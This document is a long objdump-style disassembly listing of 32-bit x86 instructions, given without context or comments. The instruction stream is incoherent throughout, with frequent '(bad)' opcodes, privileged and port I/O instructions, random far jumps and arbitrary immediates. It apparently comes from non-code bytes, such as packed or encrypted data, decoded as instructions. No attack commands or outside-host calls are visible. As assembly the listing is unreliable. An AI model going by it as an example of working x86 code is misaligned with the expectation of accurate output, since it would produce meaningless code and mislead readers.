  412c2b:	sbb    DWORD PTR [ebx+0x7fcd1358],edi
  412c31:	stos   BYTE PTR es:[edi],al
  412c32:	xchg   esp,eax
  412c33:	pop    ebx
  412c34:	sub    eax,0xa7f61fbc
  412c39:	mov    bl,0xe1
  412c3b:	and    al,0x8f
  412c3d:	xchg   DWORD PTR [edi-0x7eb0721d],esp
  412c43:	mov    bh,0xd4
  412c45:	mov    bl,0xd2
  412c47:	sbb    al,BYTE PTR [eax+eiz*2-0x72eef69d]
  412c4e:	cmc    
  412c4f:	mov    edi,0x85607085
  412c54:	sbb    ch,BYTE PTR [esp+ecx*2+0x1251e3c7]
  412c5b:	pop    ds
  412c5c:	inc    eax
  412c5d:	into   
  412c5e:	cdq    
  412c5f:	or     al,0xf8
  412c61:	outs   dx,BYTE PTR ds:[esi]
  412c62:	(bad)  
  412c63:	es inc edi
  412c65:	cli    
  412c66:	rdmsr  
  412c68:	fist   DWORD PTR [esp+ebx*2+0x1a]
  412c6c:	inc    eax
  412c6d:	or     eax,edi
  412c6f:	cli    
  412c70:	cdq    
  412c71:	dec    esp
  412c72:	loope  0x412ce8
  412c74:	in     al,dx
  412c75:	mov    eax,ds:0x42bd07a8
  412c7a:	mov    ch,0x22
  412c7c:	mov    edx,0x2c52951e
  412c81:	pop    esp
  412c82:	pop    eax
  412c83:	fimul  WORD PTR [edi-0x44]
  412c86:	mov    esp,0x5cae6a60
  412c8b:	repz inc esp
  412c8d:	in     eax,dx
  412c8e:	data16 and BYTE PTR es:[ebp-0x7a2c2428],al
  412c96:	cwde   
  412c97:	push   esp
  412c98:	or     al,0x93
  412c9a:	lods   al,BYTE PTR ds:[esi]
  412c9b:	jl     0x412d11
  412c9d:	mov    ebp,0x96974ab6
  412ca2:	neg    BYTE PTR [ebp+0x1056c93e]
  412ca8:	pop    ebp
  412ca9:	dec    ebp
  412caa:	push   ebx
  412cab:	xchg   esi,eax
  412cac:	adc    ah,BYTE PTR [ebp+0x548a9358]
  412cb2:	adc    eax,0x136c984f
  412cb7:	dec    cx
  412cb9:	rcl    DWORD PTR [eax+0x3dd8c25b],cl
  412cbf:	setl   BYTE PTR [edx-0x57a80ce0]
  412cc6:	(bad)  
  412cc7:	fiadd  DWORD PTR [edx+0x1b15a030]
  412ccd:	test   al,0x88
  412ccf:	jnp    0x412cf1
  412cd1:	data16 js 0x412d2e
  412cd4:	rep outs dx,DWORD PTR ds:[esi]
  412cd7:	mov    esi,0xf627385a
  412cdc:	dec    eax
  412cdd:	sbb    edi,DWORD PTR [edi]
  412cdf:	mov    ds:0x39329730,al
  412ce4:	aaa    
  412ce5:	sbb    al,0x80
  412ce7:	cmovns ebx,edi
  412cea:	aad    0xa1
  412cec:	and    edi,DWORD PTR [edx+esi*1-0x3f]
  412cf0:	xor    DWORD PTR [edi-0x3cfcaa79],0xff7457c3
  412cfa:	add    BYTE PTR [ebp+0x39],bl
  412cfd:	xchg   edx,eax
  412cfe:	bound  eax,QWORD PTR [ebx]
  412d00:	push   edx
  412d01:	jg     0x412ca0
  412d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d04:	lods   al,BYTE PTR ds:[esi]
  412d05:	xchg   edi,eax
  412d06:	shr    esi,1
  412d08:	jne    0x412ccb
  412d0a:	add    BYTE PTR ds:0xff7cfe89,dh
  412d10:	cs and al,0x37
  412d13:	lods   eax,DWORD PTR ds:[esi]
  412d14:	push   esp
  412d15:	jmp    0x412cdf
  412d17:	test   BYTE PTR [eax+0x3],ah
  412d1a:	sbb    BYTE PTR [ebx-0x1b],cl
  412d1d:	cmp    WORD PTR [esi-0x6f],dx
  412d21:	stos   BYTE PTR es:[edi],al
  412d22:	or     BYTE PTR [edx-0x12f67428],dl
  412d28:	pop    ebx
  412d29:	stos   BYTE PTR es:[edi],al
  412d2a:	fmul   QWORD PTR [ecx-0x1e]
  412d2d:	pop    edi
  412d2e:	hlt    
  412d2f:	push   edx
  412d30:	jecxz  0x412d9b
  412d32:	iret   
  412d33:	cmp    dh,BYTE PTR [edx]
  412d35:	or     BYTE PTR [eax+0x27],ch
  412d38:	mov    ds:0x88269ff4,al
  412d3d:	das    
  412d3e:	or     DWORD PTR ds:0x3768,esp
  412d43:	enter  0x9e96,0x95
  412d47:	outs   dx,DWORD PTR ds:[esi]
  412d48:	test   eax,0xd7e36268
  412d4d:	lods   eax,DWORD PTR ds:[esi]
  412d4e:	bound  edx,QWORD PTR [esi-0x58]
  412d51:	sub    cl,0x9c
  412d54:	repnz lea edi,es:0x83ac8027
  412d5c:	dec    esp
  412d5d:	cmp    eax,0x56edcceb
  412d62:	icebp  
  412d63:	icebp  
  412d64:	push   ebp
  412d65:	sub    eax,0xcaa7c016
  412d6a:	inc    esi
  412d6b:	or     esp,ecx
  412d6d:	and    BYTE PTR [ebp-0x740c2690],ch
  412d73:	scas   al,BYTE PTR es:[edi]
  412d74:	pop    edx
  412d75:	add    eax,0x21a1c1ef
  412d7a:	test   eax,0x5c38de16
  412d7f:	push   cs
  412d80:	xchg   ecx,eax
  412d81:	xchg   ebx,eax
  412d82:	jle    0x412de5
  412d84:	retf   
  412d85:	mov    cl,0x38
  412d87:	popf   
  412d88:	fldenv [ecx]
  412d8a:	imul   BYTE PTR [edx-0x408a2a94]
  412d90:	ss fs mov bl,0xf4
  412d94:	xchg   edx,eax
  412d95:	clc    
  412d96:	scas   al,BYTE PTR es:[edi]
  412d97:	mov    al,0x2d
  412d99:	xchg   ecx,eax
  412d9a:	cwde   
  412d9b:	cmp    BYTE PTR [edx-0x2f],0x6a
  412d9f:	pop    eax
  412da0:	out    0x8,al
  412da2:	mov    ah,0x5a
  412da4:	push   eax
  412da5:	cmp    al,0x26
  412da7:	adc    al,0xd8
  412da9:	stos   BYTE PTR es:[edi],al
  412daa:	push   edi
  412dab:	mov    edx,edx
  412dad:	and    al,0x91
  412daf:	sub    BYTE PTR [ebx+0x4e632016],0x34
  412db6:	xor    esi,ebx
  412db8:	in     eax,0xa7
  412dba:	xor    ecx,0x7b
  412dbd:	inc    ebp
  412dbe:	jno    0x412d7c
  412dc0:	push   ds
  412dc1:	push   ds
  412dc2:	out    dx,al
  412dc3:	out    0xec,eax
  412dc5:	mov    esp,0xc0299fa1
  412dca:	add    bh,bh
  412dcc:	push   ebp
  412dcd:	or     BYTE PTR [eax+0x436f402],ch
  412dd3:	xchg   esi,eax
  412dd4:	sub    DWORD PTR [edi+0x2be004a5],eax
  412dda:	pop    esi
  412ddb:	xlat   BYTE PTR ds:[ebx]
  412ddc:	jns    0x412dd4
  412dde:	sahf   
  412ddf:	out    0xf0,al
  412de1:	sub    ebx,DWORD PTR [esp+ebp*4]
  412de4:	pop    es
  412de5:	xor    eax,0x3c70041
  412dea:	scas   eax,DWORD PTR es:[edi]
  412deb:	ins    DWORD PTR es:[edi],dx
  412dec:	les    eax,FWORD PTR [esi-0x50]
  412def:	(bad)  
  412df0:	cmc    
  412df1:	pusha  
  412df2:	or     bl,BYTE PTR [edx]
  412df4:	fdivrp st(5),st
  412df6:	jecxz  0x412e47
  412df8:	mov    ds:0xd6015b83,eax
  412dfd:	stos   DWORD PTR es:[edi],eax
  412dfe:	jge    0x412dd8
  412e00:	inc    esi
  412e01:	xchg   ebp,eax
  412e02:	mov    eax,ds:0x6145e177
  412e07:	out    0x6b,al
  412e09:	cmp    ecx,DWORD PTR [edx+0x512365c2]
  412e0f:	push   ebx
  412e10:	jnp    0x412dbb
  412e12:	inc    esp
  412e13:	(bad)  
  412e14:	call   0x11f1f1f6
  412e19:	into   
  412e1a:	pop    gs
  412e1c:	add    eax,0x4cc97609
  412e21:	push   0xf8a05ce0
  412e26:	mov    edx,0xbc602fa4
  412e2b:	sub    ebx,DWORD PTR [ebp-0x18]
  412e2e:	std    
  412e2f:	int3   
  412e30:	in     eax,0x45
  412e32:	sbb    BYTE PTR [eax+0xd],dh
  412e35:	lea    ebp,[esp+eax*1-0x18b1a504]
  412e3c:	scas   al,BYTE PTR es:[edi]
  412e3d:	dec    eax
  412e3e:	addr16 sbb al,0x9d
  412e41:	pusha  
  412e42:	xchg   ebx,eax
  412e43:	test   ebp,ebp
  412e45:	mov    ebx,0x398dc189
  412e4a:	sbb    eax,0xe3677164
  412e4f:	fcom   QWORD PTR [ebp-0x2209db00]
  412e55:	popf   
  412e56:	and    DWORD PTR [ebx+0x63],esi
  412e59:	es retf 0xa74e
  412e5d:	arpl   dx,bx
  412e5f:	icebp  
  412e60:	cmp    al,0x66
  412e62:	je     0x412ecc
  412e64:	mov    dh,0x87
  412e66:	enter  0x5656,0xfc
  412e6a:	mov    ah,0x15
  412e6c:	imul   esi,DWORD PTR [ebx+0x27],0xffffffc6
  412e70:	std    
  412e71:	mov    ds:0x7cf8710c,eax
  412e76:	add    ebx,DWORD PTR [ecx+0x58]
  412e79:	loop   0x412dff
  412e7b:	in     eax,dx
  412e7c:	stc    
  412e7d:	daa    
  412e7e:	push   edx
  412e7f:	ins    DWORD PTR es:[edi],dx
  412e80:	scas   eax,DWORD PTR es:[edi]
  412e81:	loope  0x412e6b
  412e83:	ds xchg edx,eax
  412e85:	int3   
  412e86:	stc    
  412e87:	and    BYTE PTR [ebp+0x66],cl
  412e8a:	es push 0x34
  412e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e8e:	sbb    cl,dh
  412e90:	stc    
  412e91:	lods   eax,DWORD PTR ds:[esi]
  412e92:	dec    eax
  412e93:	cdq    
  412e94:	aam    0x4d
  412e96:	sbb    eax,0x834c4b3a
  412e9b:	cmc    
  412e9c:	sub    DWORD PTR [edi],ecx
  412e9e:	inc    eax
  412e9f:	pop    ds
  412ea0:	push   ecx
  412ea1:	jne    0x412edc
  412ea3:	jg     0x412e5c
  412ea5:	inc    edx
  412ea6:	pop    esp
  412ea7:	lds    ebx,FWORD PTR [edx-0x42]
  412eaa:	jbe    0x412f1c
  412eac:	in     al,0xd1
  412eae:	adc    al,0x3
  412eb0:	dec    ebx
  412eb1:	mov    eax,0xffe1e72a
  412eb6:	cmp    esi,ecx
  412eb8:	dec    esp
  412eb9:	imul   edx,DWORD PTR [eax-0x4e],0x5be7e9dc
  412ec0:	dec    edi
  412ec1:	retf   
  412ec2:	and    al,0xf0
  412ec4:	inc    ebp
  412ec5:	out    dx,al
  412ec6:	mov    esi,0x156daee1
  412ecb:	xchg   cl,dl
  412ecd:	shl    BYTE PTR [ebp-0x77],0xef
  412ed1:	out    0x2e,al
  412ed3:	repnz pop esp
  412ed5:	mov    WORD PTR [edi-0x76],fs
  412ed8:	and    edx,ebx
  412eda:	sti    
  412edb:	clc    
  412edc:	mov    al,ds:0x9abf8a27
  412ee1:	aaa    
  412ee2:	sub    edi,edx
  412ee4:	adc    BYTE PTR [edi-0x2c],ch
  412ee7:	push   eax
  412ee8:	mov    edx,0xe3afd5eb
  412eed:	push   ebp
  412eee:	arpl   ax,di
  412ef0:	(bad)  
  412ef2:	mov    edi,0x10df525f
  412ef7:	or     ah,0x4b
  412efa:	jb     0x412e9a
  412efc:	cmp    al,0x55
  412efe:	cmp    DWORD PTR [ecx-0x17],ebp
  412f01:	movaps xmm0,xmm5
  412f04:	into   
  412f05:	pop    edi
  412f06:	and    DWORD PTR [edi+ecx*8],edi
  412f09:	adc    cl,BYTE PTR [edi+ebx*8-0x2]
  412f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0e:	sub    al,0x78
  412f10:	in     al,0xe1
  412f12:	mov    esp,0x920ed7de
  412f17:	shl    ebp,cl
  412f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f1a:	test   BYTE PTR [ecx],0x69
  412f1d:	and    dl,BYTE PTR gs:[ebp+ebp*2-0x4f206766]
  412f25:	pushf  
  412f26:	imul   esi,DWORD PTR [ecx-0x1efd5691],0x58e565b
  412f30:	add    eax,0x42266f48
  412f35:	retf   0x40a0
  412f38:	cwde   
  412f39:	mov    edx,0x11fc097
  412f3e:	add    ebx,DWORD PTR [edi-0x5bef6bcc]
  412f44:	js     0x412f08
  412f46:	jmp    0xc9f0:0xe0a7684a
  412f4d:	mov    eax,ds:0xee87b6b9
  412f52:	mov    al,0x93
  412f54:	scas   eax,DWORD PTR es:[edi]
  412f55:	mov    ch,cl
  412f57:	dec    esp
  412f58:	push   edi
  412f59:	mov    esp,0x16c4ee6d
  412f5e:	cs aad 0xe
  412f61:	jne    0x412fe2
  412f63:	(bad)  
  412f64:	int3   
  412f65:	mov    bl,0xe9
  412f67:	add    bh,BYTE PTR [edi-0x21]
  412f6a:	sbb    al,0xd2
  412f6c:	inc    ecx
  412f6d:	inc    esi
  412f6f:	dec    edi
  412f70:	out    dx,eax
  412f71:	out    dx,eax
  412f72:	cmp    dh,BYTE PTR [edx-0x5]
  412f75:	pop    ebp
  412f76:	hlt    
  412f77:	xchg   edi,eax
  412f78:	dec    ebx
  412f79:	mov    bh,0xb6
  412f7b:	(bad)  
  412f7c:	call   0xcdff8201
  412f81:	adc    al,bh
  412f83:	push   esi
  412f84:	test   DWORD PTR [eax],edx
  412f86:	adc    bl,BYTE PTR [ebp-0x64]
  412f89:	pop    edi
  412f8a:	ss icebp 
  412f8c:	test   esi,0x2e232b13
  412f92:	cmp    dh,BYTE PTR [ebx]
  412f94:	clc    
  412f95:	push   ebp
  412f96:	sbb    eax,edi
  412f98:	pop    ds
  412f99:	and    ch,BYTE PTR [esi]
  412f9b:	sbb    al,0x42
  412f9d:	xor    DWORD PTR [eax],edi
  412f9f:	imul   ecx,DWORD PTR [ebx],0xffffff85
  412fa2:	pop    ecx
  412fa3:	add    ecx,ebp
  412fa5:	inc    edi
  412fa6:	lahf   
  412fa7:	jbe    0x412fdf
  412fa9:	aad    0x8b
  412fab:	jmp    0xfad02b1f
  412fb0:	scas   al,BYTE PTR es:[edi]
  412fb1:	out    0xcd,eax
  412fb3:	and    eax,0xf762b2f0
  412fb8:	mov    edi,0xd35fde54
  412fbd:	retf   
  412fbe:	data16 jne 0x412f90
  412fc1:	test   eax,0x35140dac
  412fc6:	rcr    BYTE PTR [eax-0x52867d69],0x89
  412fcd:	inc    edx
  412fce:	xchg   edi,eax
  412fcf:	sub    ebp,DWORD PTR [esi-0x32832d8e]
  412fd5:	fisttp DWORD PTR [ebx-0x64b797a3]
  412fdb:	je     0x413029
  412fdd:	out    dx,al
  412fde:	pop    eax
  412fdf:	add    eax,0x19da668e
  412fe4:	jbe    0x412f7a
  412fe6:	sti    
  412fe7:	dec    ecx
  412fe8:	xchg   esp,eax
  412fe9:	mov    ebx,0xc8a0d101
  412fee:	sbb    DWORD PTR [eax],edx
  412ff0:	jne    0x413069
  412ff2:	call   0xea65:0x5bcdc973
  412ff9:	stos   DWORD PTR es:[edi],eax
  412ffa:	mov    al,ds:0xd1a0b276
  412fff:	ss stos BYTE PTR es:[edi],al
  413001:	jmp    0x412f92
  413003:	test   cl,al
  413005:	lahf   
  413006:	adc    eax,0xa3f87186
  41300b:	jmp    0x4bd5fbff
  413010:	outs   dx,DWORD PTR ds:[esi]
  413011:	data16 sub bh,al
  413014:	arpl   bp,sp
  413016:	pop    esp
  413017:	xor    esi,DWORD PTR [ebx-0x16e9f26b]
  41301d:	stos   BYTE PTR es:[edi],al
  41301e:	mov    WORD PTR [ecx],gs
  413020:	lods   eax,DWORD PTR ds:[esi]
  413021:	xor    edx,DWORD PTR [ecx-0x17]
  413024:	je     0x413036
  413026:	lock (bad) 
  413029:	enter  0x8db9,0x26
  41302d:	fnstcw WORD PTR [eax-0x57e680cc]
  413033:	sbb    edx,DWORD PTR [eax+0x1b]
  413036:	cli    
  413037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413038:	inc    esp
  413039:	mov    ch,0xb3
  41303b:	and    DWORD PTR [edi+0x62],0xae198fa9
  413042:	adc    BYTE PTR [ebp-0x61],ch
  413045:	or     BYTE PTR [edi+eax*1-0x6b83b9a1],bh
  41304c:	inc    ecx
  41304d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41304e:	mov    dl,0x9e
  413050:	sahf   
  413051:	mov    dh,0x8c
  413053:	imul   DWORD PTR [ebx]
  413055:	adc    DWORD PTR [ecx+0x5d9b80fe],edi
  41305b:	pop    eax
  41305c:	xchg   ebx,eax
  41305d:	pop    ebx
  41305e:	cmp    ecx,ebx
  413060:	lea    edi,[ebp-0x502abf08]
  413066:	outs   dx,DWORD PTR ds:[esi]
  413067:	retf   
  413068:	(bad)  
  413069:	adc    DWORD PTR [esi-0x3a047d75],esp
  41306f:	inc    ebp
  413070:	jmp    0x9409:0xbba350cc
  413077:	mov    dh,0x94
  413079:	int    0xa7
  41307b:	sub    edi,ecx
  41307d:	nop
  41307e:	(bad)  
  41307f:	or     BYTE PTR [eax],0x52
  413082:	push   ebx
  413083:	outs   dx,DWORD PTR ds:[esi]
  413084:	out    0x30,al
  413086:	or     BYTE PTR [esi+0x7d],cl
  413089:	cwde   
  41308a:	sub    BYTE PTR [esi],0x19
  41308d:	mov    ebx,0x8eb3c0a3
  413092:	sbb    ebp,DWORD PTR [ebx]
  413094:	sti    
  413095:	clc    
  413096:	push   ebx
  413097:	retf   0xe343
  41309a:	adc    al,0x90
  41309c:	std    
  41309d:	repnz data16 fadd QWORD PTR [esi+ebp*8+0x36]
  4130a3:	dec    edi
  4130a4:	xor    dh,BYTE PTR ds:[ebx]
  4130a7:	cmp    BYTE PTR [ebp+0x35],dl
  4130aa:	sbb    edx,DWORD PTR [esi]
  4130ac:	mov    dh,0xf1
  4130ae:	jne    0x4130c3
  4130b0:	or     BYTE PTR [edi],bh
  4130b2:	xchg   ebp,eax
  4130b3:	inc    esi
  4130b4:	xor    al,0x25
  4130b6:	jmp    0x2739:0x46ec13e5
  4130bd:	dec    edx
  4130be:	mov    eax,0x70e5163c
  4130c3:	push   0xa92d5ecc
  4130c8:	inc    edi
  4130c9:	push   ds
  4130ca:	mov    eax,0x3e394844
  4130cf:	dec    edi
  4130d0:	int    0x8a
  4130d2:	push   esp
  4130d3:	jo     0x41305c
  4130d5:	push   0xffffffe5
  4130d7:	je     0x4130be
  4130d9:	in     eax,dx
  4130da:	push   eax
  4130db:	mov    eax,ds:0x56571b7b
  4130e0:	repz aas 
  4130e2:	adc    bl,BYTE PTR [esi+0x37]
  4130e5:	jg     0x41315e
  4130e7:	or     DWORD PTR [ecx],ecx
  4130e9:	lods   al,BYTE PTR ds:[esi]
  4130ea:	lods   al,BYTE PTR ds:[esi]
  4130eb:	loopne 0x413072
  4130ed:	rcr    BYTE PTR [edx],1
  4130ef:	inc    eax
  4130f0:	xchg   edi,eax
  4130f1:	sbb    eax,0x415e84bc
  4130f6:	int    0x94
  4130f8:	js     0x413140
  4130fa:	sbb    eax,DWORD PTR [edi]
  4130fc:	shl    DWORD PTR [eax],0x38
  4130ff:	mov    edi,0xd25059a9
  413104:	sbb    BYTE PTR [edi],al
  413106:	xchg   BYTE PTR [eax+0x5],dl
  413109:	xchg   ebx,eax
  41310a:	inc    ebx
  41310b:	cmp    BYTE PTR [esi],ah
  41310d:	push   ss
  41310e:	xchg   ecx,eax
  41310f:	scas   eax,DWORD PTR es:[edi]
  413110:	pop    ebp
  413111:	fiadd  WORD PTR [eax+0x7dc93746]
  413117:	scas   eax,DWORD PTR es:[edi]
  413118:	sub    DWORD PTR ds:0xd04167fb,0xffffffb8
  41311f:	das    
  413120:	sti    
  413121:	jecxz  0x41318c
  413123:	repnz call 0x8d69:0x4af316e2
  41312b:	push   esp
  41312c:	xchg   edi,eax
  41312d:	repnz push ebp
  41312f:	adc    BYTE PTR [ebp+0x24ac78ef],ah
  413135:	mov    ss,WORD PTR ds:0x8e60
  41313a:	push   esp
  41313b:	pop    esp
  41313c:	ss xchg esp,eax
  41313e:	push   eax
  41313f:	(bad)  
  413140:	sbb    eax,DWORD PTR [eax]
  413142:	push   esp
  413143:	imul   ecx,DWORD PTR [edi],0x311464ab
  413149:	add    cl,BYTE PTR [ebx]
  41314b:	adc    al,0xe4
  41314d:	popa   
  41314e:	xor    BYTE PTR [edi-0x4a],dl
  413151:	jg     0x413142
  413153:	xlat   BYTE PTR ds:[ebx]
  413154:	shl    BYTE PTR [edi+0x34],cl
  413157:	jecxz  0x41313e
  413159:	jno    0x4131ae
  41315b:	jns    0x4130e6
  41315d:	lods   al,BYTE PTR ds:[esi]
  41315e:	and    eax,0x4cac112e
  413163:	push   ss
  413164:	dec    ecx
  413165:	test   BYTE PTR [eax],dl
  413167:	and    al,ch
  413169:	clc    
  41316a:	in     eax,0x49
  41316c:	pop    ebp
  41316d:	pushf  
  41316e:	adc    BYTE PTR [edi+0x7c1a66c6],al
  413174:	jg     0x413176
  413176:	pushf  
  413177:	cwde   
  413178:	lahf   
  413179:	int    0x55
  41317b:	sub    eax,0xfca6b62e
  413180:	sub    BYTE PTR [ebx],0xa5
  413183:	inc    esp
  413184:	inc    ecx
  413185:	lods   al,BYTE PTR ds:[esi]
  413186:	jmp    FWORD PTR [edx]
  413188:	push   edi
  413189:	das    
  41318a:	mov    edi,0xbce76a97
  41318f:	xor    al,0xb8
  413191:	lock mov ecx,DWORD PTR [ebx+esi*1]
  413195:	repnz sub dh,0xe9
  413199:	push   eax
  41319a:	iret   
  41319b:	mov    ah,0x56
  41319d:	push   cs
  41319e:	push   0x72
  4131a0:	rol    DWORD PTR [ebx],cl
  4131a2:	push   cs
  4131a3:	fsub   QWORD PTR [edx+0x28]
  4131a6:	(bad)  [eax-0x6e]
  4131a9:	repz inc esp
  4131ab:	fsubr  DWORD PTR [esi]
  4131ad:	mov    eax,0x735ebeb6
  4131b2:	push   esi
  4131b3:	sub    ebp,ebx
  4131b5:	(bad)  
  4131b6:	inc    ebp
  4131b7:	fwait
  4131b8:	xchg   dl,al
  4131ba:	add    al,0xc4
  4131bc:	and    al,0x6
  4131be:	fidivr DWORD PTR ds:0xfcffda42
  4131c4:	jle    0x413172
  4131c6:	out    dx,eax
  4131c7:	mov    esp,0x8cc9f7ad
  4131cc:	mov    WORD PTR [esi+0xbe2128f],cs
  4131d2:	shl    BYTE PTR [ebp+0x60],1
  4131d5:	sbb    BYTE PTR [ebp-0x58],0x13
  4131d9:	imul   esp,ebx,0x6a
  4131dc:	sahf   
  4131dd:	pop    ecx
  4131de:	cmp    dl,cl
  4131e0:	or     DWORD PTR [edi+0x2c16544a],edi
  4131e6:	pop    edi
  4131e7:	xor    al,0x43
  4131e9:	sti    
  4131ea:	aas    
  4131eb:	inc    BYTE PTR [edx+ebp*2]
  4131ee:	outs   dx,DWORD PTR ds:[esi]
  4131ef:	out    dx,al
  4131f0:	dec    ebx
  4131f1:	mov    al,ds:0x14f369df
  4131f6:	xor    BYTE PTR [edx+0x4e],ah
  4131f9:	rcr    eax,1
  4131fb:	retf   0x94c4
  4131fe:	jp     0x413222
  413200:	xchg   ebx,eax
  413201:	xchg   esp,eax
  413202:	pop    es
  413203:	push   ebp
  413204:	imul   edx,DWORD PTR [ecx+ebp*4],0xffffffa7
  413208:	jae    0x413253
  41320a:	xchg   esp,eax
  41320b:	mov    esi,0xd336b2b6
  413210:	jg     0x41320d
  413212:	into   
  413213:	push   ebp
  413214:	jne    0x413266
  413216:	jne    0x4131a6
  413218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413219:	pop    ebp
  41321a:	mov    esi,ebx
  41321c:	retf   0x4c1c
  41321f:	les    edx,FWORD PTR [edi+0x49]
  413222:	popf   
  413223:	(bad)  
  413224:	sub    eax,0xc280a805
  413229:	rcr    al,cl
  41322b:	pop    ds
  41322c:	add    eax,0x26851aed
  413231:	jge    0x413200
  413233:	in     eax,0xce
  413235:	cs xor ecx,edi
  413238:	jae    0x4131ba
  41323a:	fsubr  DWORD PTR [ecx]
  41323c:	mov    ebx,0x9634aa1d
  413241:	cdq    
  413242:	data16 data16 jle 0x4131fa
  413246:	repz jbe 0x413266
  413249:	das    
  41324a:	and    eax,0x7e77c2ad
  41324f:	cmp    al,0x94
  413251:	pop    ss
  413252:	jo     0x4132bc
  413254:	mov    esp,0xac0ba01a
  413259:	fstp   TBYTE PTR [ebx+0xe9936ee]
  41325f:	pop    DWORD PTR ds:0x5cba0db6
  413265:	add    esi,esp
  413267:	inc    esp
  413268:	cmp    eax,0xd34ee014
  41326d:	ins    BYTE PTR es:[edi],dx
  41326e:	loope  0x413200
  413270:	cmp    eax,0x6efea8dc
  413275:	pop    esp
  413276:	mov    al,ds:0x9b42fa9b
  41327b:	fcomi  st,st(0)
  41327d:	(bad)  
  41327e:	scas   eax,DWORD PTR es:[edi]
  41327f:	shr    DWORD PTR [edx+0x21],cl
  413282:	in     eax,0x7d
  413284:	mov    ch,0xa5
  413286:	scas   al,BYTE PTR es:[edi]
  413287:	inc    edx
  413288:	mov    BYTE PTR [esp+eax*2-0x2a],ch
  41328c:	mov    DWORD PTR [ebp-0x24729e98],ecx
  413292:	loope  0x413234
  413294:	push   cs
  413295:	mov    al,0x90
  413297:	cmp    BYTE PTR [ecx+0x1d1d4ca9],dh
  41329d:	mov    cl,0xe0
  41329f:	adc    eax,0x2909afaf
  4132a4:	adc    ecx,DWORD PTR [esi+0x66c5c06a]
  4132aa:	fbstp  TBYTE PTR [eax]
  4132ac:	adc    BYTE PTR [esi+0x1c26ca09],cl
  4132b2:	(bad)  
  4132b3:	mov    eax,DWORD PTR [ebp+esi*1-0x34c58a54]
  4132ba:	inc    ebx
  4132bb:	fwait
  4132bc:	std    
  4132bd:	(bad)  
  4132be:	mov    ds:0x88a00d26,eax
  4132c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132c4:	mov    bl,0xf6
  4132c6:	ss cdq 
  4132c8:	xchg   ecx,eax
  4132c9:	or     eax,0xa8d10398
  4132ce:	ret    
  4132cf:	push   ebp
  4132d0:	std    
  4132d1:	xchg   esp,eax
  4132d2:	ins    BYTE PTR es:[edi],dx
  4132d3:	dec    esi
  4132d4:	loop   0x41331f
  4132d6:	xor    DWORD PTR ds:0x3512fef7,ebp
  4132dc:	(bad)  
  4132dd:	sti    
  4132de:	popa   
  4132df:	dec    ecx
  4132e0:	inc    edi
  4132e1:	jne    0x413295
  4132e3:	ins    DWORD PTR es:[edi],dx
  4132e4:	or     bh,BYTE PTR [edi]
  4132e6:	in     al,dx
  4132e7:	lods   al,BYTE PTR ds:[esi]
  4132e8:	add    esi,ecx
  4132ea:	and    eax,0x8c4b726d
  4132ef:	inc    eax
  4132f0:	test   eax,0xb072a4f8
  4132f5:	lea    ecx,[ebp+ebx*4+0x39]
  4132f9:	push   ss
  4132fa:	enter  0x7011,0xb9
  4132fe:	in     al,dx
  4132ff:	ds or  eax,0x87eb04ce
  413305:	jecxz  0x41334b
  413307:	retf   0x430b
  41330a:	inc    ebp
  41330b:	fild   WORD PTR [ecx+0x31]
  41330e:	idiv   DWORD PTR [edx-0x5e]
  413311:	xchg   edx,eax
  413312:	push   edi
  413313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413314:	push   0x6327ff01
  413319:	gs cmp eax,0x268ebe25
  41331f:	cmp    BYTE PTR [ebp+0x48fdad8e],cl
  413325:	(bad)  
  413326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413327:	or     esp,DWORD PTR ds:0x659a665f
  41332d:	cs int 0xae
  413330:	mov    bh,0x7
  413332:	(bad)  
  413333:	pushf  
  413334:	mov    ch,0xb1
  413336:	push   ebp
  413337:	out    0x9b,al
  413339:	jge    0x413383
  41333b:	imul   ebp,DWORD PTR [edx-0x80],0x15
  41333f:	adc    eax,0xb52390c9
  413344:	addr16 mov edx,0xd63f3a71
  41334a:	(bad)  
  41334b:	into   
  41334c:	mov    al,0x67
  41334e:	xchg   BYTE PTR [ebp-0x64],ch
  413351:	mov    DWORD PTR [edx],ebp
  413353:	mov    ds:0x3b75d4cc,eax
  413358:	(bad)  
  413359:	push   cs
  41335a:	cmp    al,0x71
  41335c:	pop    ebp
  41335d:	aam    0xea
  41335f:	shr    DWORD PTR [edi-0x689119d4],cl
  413365:	sbb    esp,ecx
  413367:	gs push edx
  413369:	xchg   esp,eax
  41336a:	out    0x87,eax
  41336c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41336d:	lahf   
  41336e:	test   DWORD PTR [ecx+edi*4-0x6c],esi
  413372:	sahf   
  413373:	fistp  QWORD PTR [edi]
  413375:	push   0x1da897a3
  41337a:	outs   dx,BYTE PTR ds:[esi]
  41337b:	(bad)  
  41337c:	and    DWORD PTR [ecx],esi
  41337e:	adc    DWORD PTR [edx],esi
  413380:	loope  0x413351
  413382:	stos   DWORD PTR es:[edi],eax
  413383:	mov    WORD PTR [esi],gs
  413385:	arpl   sp,dx
  413387:	mov    edi,0x44f7b71f
  41338c:	push   esp
  41338d:	(bad)  
  41338e:	sbb    al,0x1b
  413390:	mov    ch,0xa4
  413392:	pop    ebx
  413393:	out    dx,eax
  413394:	mov    ds:0x3ca67687,eax
  413399:	fadd   st(7),st
  41339b:	adc    al,0x3d
  41339d:	jmp    0x65f5:0xd536fe10
  4133a4:	xchg   ebx,eax
  4133a5:	cs jb  0x413334
  4133a8:	jecxz  0x413411
  4133aa:	fistp  DWORD PTR [edi]
  4133ac:	add    DWORD PTR [edi],edx
  4133ae:	ret    
  4133af:	push   ds
  4133b0:	rol    DWORD PTR [edi+0x65af94a2],0xd1
  4133b7:	(bad)  
  4133b8:	mov    fs,WORD PTR [esi+0x3f70ee62]
  4133be:	inc    eax
  4133bf:	xchg   ebp,eax
  4133c0:	das    
  4133c1:	rcr    DWORD PTR [eax],1
  4133c3:	cli    
  4133c4:	(bad)  
  4133c5:	div    BYTE PTR ds:0x899df26e
